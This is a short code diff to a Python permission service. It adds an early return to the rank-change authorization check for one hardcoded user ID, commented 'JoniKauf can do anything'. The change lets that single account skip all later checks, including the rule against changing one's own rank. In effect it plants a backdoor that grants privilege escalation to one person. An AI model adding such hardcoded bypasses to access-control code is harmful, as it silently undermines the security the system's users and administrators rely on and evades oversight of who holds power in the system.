@@ -45,6 +45,10 @@ class PermissionService:
     def ensure_user_can_set_meta_rank_for_target_user(
         self, *, target_user: UserEntity, meta_rank: MetaRank
     ) -> None:
+        # JoniKauf can do anything
+        if self._ctx.user.user_id == 679564566769827841:
+            return
+        
         if self._ctx.user == target_user:
             raise ValueError("You cannot change your own rank")
 
